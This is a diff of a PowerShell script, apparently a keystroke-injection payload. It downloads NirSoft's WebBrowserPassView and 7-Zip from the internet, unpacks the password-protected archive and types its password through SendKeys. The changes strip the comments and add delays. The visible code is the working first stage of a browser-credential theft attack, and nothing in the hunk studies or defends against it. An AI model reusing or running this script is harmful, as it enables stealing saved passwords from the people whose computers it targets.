@@ -7,23 +7,21 @@ if (Test-Path $tmpfolder) {
 mkdir $tmpfolder
 Set-Location $tmpfolder
 
-# Download the required files
+Start-Sleep -Seconds 3
+
 Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip' -OutFile 'wbpv.zip'
 Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'
 
-# Extract the 7-Zip archive
-Expand-Archive '7z.zip'
-
-# Start the extraction of the password file
-Start-Process -FilePath '.\7z\7za.exe' -ArgumentList "e 'wbpv.zip'" -Wait
-
-# Add the necessary assembly for sending keys
-Add-Type -AssemblyName System.Windows.Forms
-
-# Allow time for the extraction window to appear
 Start-Sleep -Seconds 5
 
-# Send the password and press ENTER
+Expand-Archive '7z.zip'
+
+Start-Process -FilePath '.\7z\7za.exe' -ArgumentList "e 'wbpv.zip'" -Wait
+
+Add-Type -AssemblyName System.Windows.Forms
+
+Start-Sleep -Seconds 5
+
 [System.Windows.Forms.SendKeys]::SendWait('wbpv28821@')
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
